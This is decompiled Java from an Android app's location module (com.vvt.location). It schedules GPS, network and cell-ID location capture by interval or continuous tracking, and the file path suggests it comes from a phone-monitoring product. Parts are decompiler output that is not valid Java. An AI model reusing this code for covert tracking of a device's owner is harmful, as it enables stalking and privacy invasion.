package com.vvt.location;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.telephony.TelephonyManager;
import com.vvt.io.q;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private d d;
  private com.vvt.aj.c e;
  private f f;
  private List g;
  private LocationCaptureMode h;
  private LocationManager i;
  private j j;
  private o k;
  private String l;
  private String m;
  private TelephonyManager n;
  private h o;
  private long p;
  private long q;
  private long r;
  private Thread.UncaughtExceptionHandler s;
  
  public a(TelephonyManager paramTelephonyManager, LocationManager paramLocationManager, j paramj, String paramString1, String paramString2, com.vvt.aj.c paramc)
  {
    Object localObject1 = new com/vvt/location/c;
    ((c)localObject1).<init>(this);
    this.s = ((Thread.UncaughtExceptionHandler)localObject1);
    this.n = paramTelephonyManager;
    this.i = paramLocationManager;
    this.j = paramj;
    int i1 = 2;
    Object localObject2 = new Object[i1];
    localObject2[0] = paramString1;
    int i2 = 1;
    localObject2[i2] = paramString2;
    localObject1 = String.format("%s/%s.dat", (Object[])localObject2);
    this.m = ((String)localObject1);
    this.l = paramString2;
    this.e = paramc;
    this.q = 180000L;
    this.r = 0L;
    long l1 = 60000L;
    this.p = l1;
    localObject1 = paramLocationManager.getProviders(false);
    this.g = ((List)localObject1);
    localObject1 = this.g;
    if (localObject1 != null)
    {
      localObject1 = this.g;
      localObject2 = "passive";
      ((List)localObject1).remove(localObject2);
    }
    boolean bool = b;
    if (bool) {}
  }
  
  private void a(LocationListener paramLocationListener)
  {
    if (paramLocationListener != null)
    {
      LocationManager localLocationManager = this.i;
      localLocationManager.removeUpdates(paramLocationListener);
      boolean bool = a;
      if (!bool) {}
    }
  }
  
  private void a(PersistingTimer paramPersistingTimer)
  {
    String str = this.m;
    q.a(paramPersistingTimer, str);
  }
  
  private void a(Timer paramTimer, TimerTask paramTimerTask, long paramLong1, long paramLong2)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = g();
    Object localObject2;
    long l1;
    long l3;
    if (localObject1 != null)
    {
      localObject2 = this.e;
      l1 = ((com.vvt.aj.c)localObject2).a();
      long l2 = ((PersistingTimer)localObject1).getBeginElapsedTimeMs();
      l3 = ((PersistingTimer)localObject1).getTriggerElapsedTimeMs();
      bool = a;
      if (bool) {}
      bool = l1 < l2;
      if (!bool)
      {
        bool = l1 < l3;
        if (!bool) {}
      }
      else
      {
        bool = b;
        if (bool) {}
        bool = b;
        if (bool) {}
        localObject1 = new com/vvt/location/b;
        localObject2 = "LocationOT";
        ((b)localObject1).<init>(this, (String)localObject2, paramTimerTask);
        ((Thread)localObject1).start();
      }
    }
    for (long l4 = paramLong1;; l4 = paramLong1)
    {
      bool = a;
      if (bool) {}
      b(l4);
      bool = a;
      if (bool) {}
      localObject1 = paramTimer;
      localObject2 = paramTimerTask;
      paramTimer.schedule(paramTimerTask, l4, paramLong2);
      bool = a;
      if (bool) {}
      return;
      bool = l1 < l3;
      if (bool)
      {
        paramLong1 = l3 - l1;
        bool = b;
        if (!bool) {}
      }
    }
  }
  
  private void b(long paramLong)
  {
    com.vvt.aj.c localc = this.e;
    long l1 = localc.a();
    long l2 = l1 + paramLong;
    boolean bool = b;
    if (bool) {}
    PersistingTimer localPersistingTimer = new com/vvt/location/PersistingTimer;
    localPersistingTimer.<init>();
    localPersistingTimer.setBeginElapsedTimeMs(l1);
    localPersistingTimer.setTriggerElapsedTimeMs(l2);
    a(localPersistingTimer);
  }
  
  private void f()
  {
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    long l1 = this.p;
    b(l1);
    Location localLocation = this.d.a();
    boolean bool3;
    Object localObject2;
    if (localLocation != null)
    {
      localObject1 = localLocation.getProvider();
      bool3 = a;
      if ((!bool3) || (localObject1 != null))
      {
        localObject2 = "gps";
        bool1 = ((String)localObject1).equalsIgnoreCase((String)localObject2);
        if (bool1) {
          localObject1 = LocationSource.GPS;
        }
      }
    }
    for (;;)
    {
      if (localLocation == null)
      {
        bool1 = b;
        if (bool1) {}
        label98:
        localObject1 = this.k;
        if (localObject1 != null)
        {
          bool1 = a;
          if ((bool1) && (localLocation != null)) {
            break label232;
          }
          localObject1 = this.k;
          ((o)localObject1).b();
        }
      }
      for (;;)
      {
        bool1 = a;
        if (bool1) {}
        return;
        localObject1 = LocationSource.NETWORK;
        break;
        bool2 = a;
        if (bool2) {}
        localLocation = k.e(this.n);
        if (localLocation == null) {
          break label246;
        }
        localObject1 = LocationSource.CELLID;
        localLocation = k.e(this.n);
        break;
        bool3 = b;
        if (bool3) {}
        localObject2 = new com/vvt/location/n;
        ((n)localObject2).<init>();
        ((n)localObject2).a(localLocation);
        ((n)localObject2).a((LocationSource)localObject1);
        localObject1 = this.j;
        ((j)localObject1).a((n)localObject2);
        break label98;
        label232:
        localObject1 = this.k;
        ((o)localObject1).a();
      }
      label246:
      bool2 = false;
      localLocation = null;
    }
  }
  
  private PersistingTimer g()
  {
    Object localObject = q.a(this.m);
    boolean bool = localObject instanceof PersistingTimer;
    if (bool) {}
    for (localObject = (PersistingTimer)localObject;; localObject = null) {
      return (PersistingTimer)localObject;
    }
  }
  
  public long a()
  {
    return this.p;
  }
  
  public void a(long paramLong)
  {
    this.p = paramLong;
  }
  
  public void a(long paramLong1, long paramLong2)
  {
    long l1 = 0L;
    boolean bool = paramLong1 < l1;
    if (bool) {
      this.q = paramLong1;
    }
    bool = paramLong2 < l1;
    if (bool) {
      this.r = paramLong2;
    }
  }
  
  public void a(LocationCaptureMode paramLocationCaptureMode)
  {
    this.h = paramLocationCaptureMode;
  }
  
  public void a(o paramo)
  {
    boolean bool = b;
    if ((!bool) || (paramo == null))
    {
      localObject1 = new java/lang/NullPointerException;
      ((NullPointerException)localObject1).<init>("OnLocationReceiveListener cannot be NULL!!");
      throw ((Throwable)localObject1);
    }
    this.k = paramo;
    Object localObject1 = this.d;
    if (localObject1 == null)
    {
      localObject1 = new com/vvt/location/d;
      ((d)localObject1).<init>(this, null);
      this.d = ((d)localObject1);
    }
    bool = b;
    if (bool) {}
    localObject1 = this.h;
    Object localObject2 = LocationCaptureMode.TRACKING;
    if (localObject1 == localObject2)
    {
      localObject1 = this.o;
      if (localObject1 != null)
      {
        localObject1 = new java/lang/IllegalStateException;
        ((IllegalStateException)localObject1).<init>("Start method has already been invoked!!");
        throw ((Throwable)localObject1);
      }
      localObject1 = new com/vvt/location/h;
      ((h)localObject1).<init>(this, null);
      this.o = ((h)localObject1);
      this.o.setName("TrackingThread");
      localObject1 = this.o;
      localObject2 = this.s;
      ((h)localObject1).setUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject2);
      localObject1 = this.o;
      ((h)localObject1).start();
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      return;
      localObject1 = this.f;
      if (localObject1 != null)
      {
        localObject1 = new java/lang/IllegalStateException;
        ((IllegalStateException)localObject1).<init>("Start method has already been invoked!!");
        throw ((Throwable)localObject1);
      }
      long l1 = this.p;
      long l2 = this.q;
      l1 -= l2;
      l2 = 0L;
      bool = l1 < l2;
      if (bool)
      {
        localObject1 = new java/lang/IllegalStateException;
        ((IllegalStateException)localObject1).<init>("Time interval value must not be less than the timeout value!!");
        throw ((Throwable)localObject1);
      }
      localObject1 = new com/vvt/location/f;
      ((f)localObject1).<init>(this, null);
      this.f = ((f)localObject1);
      this.f.setName("IntervalThread");
      localObject1 = this.f;
      localObject2 = this.s;
      ((f)localObject1).setUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject2);
      localObject1 = this.f;
      ((f)localObject1).start();
    }
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.o;
    if (localObject != null)
    {
      bool = b;
      if (bool) {}
      localObject = this.o;
      ((h)localObject).a();
      this.o = null;
    }
    localObject = this.f;
    if (localObject != null)
    {
      bool = b;
      if (bool) {}
      localObject = this.f;
      ((f)localObject).a();
      this.f = null;
    }
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/location/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */